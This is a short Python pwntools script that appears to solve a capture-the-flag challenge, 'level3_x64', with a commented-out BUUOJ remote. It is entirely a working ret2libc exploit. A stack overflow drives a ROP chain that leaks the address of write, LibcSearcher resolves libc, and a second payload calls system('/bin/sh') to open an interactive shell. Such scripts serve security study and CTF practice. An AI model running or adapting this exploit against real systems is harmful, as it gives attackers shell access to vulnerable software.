from pwn import *
from LibcSearcher import *

#r=remote('node3.buuoj.cn',29886)
context(os = "linux", arch = "amd64", log_level= "debug")
r= process('./level3_x64')
elf=ELF('./level3_x64')

#libc=ELF('./libc-2.19.so')

write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x40061A

rdi=0x4006b3
rsi_r15=0x4006b1

payload=b'a'*(0x80+8)+p64(rdi)+p64(1)
payload+=p64(rsi_r15)+p64(write_got)+p64(8)
payload+=p64(write_plt)
payload+=p64(main)

r.sendlineafter(b'Input:',payload)

write_addr=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
#write_addr=u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))


print(hex(write_addr))

libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system_addr=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')

payload=b'a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)

r.sendlineafter(b'Input:',payload)

r.interactive()

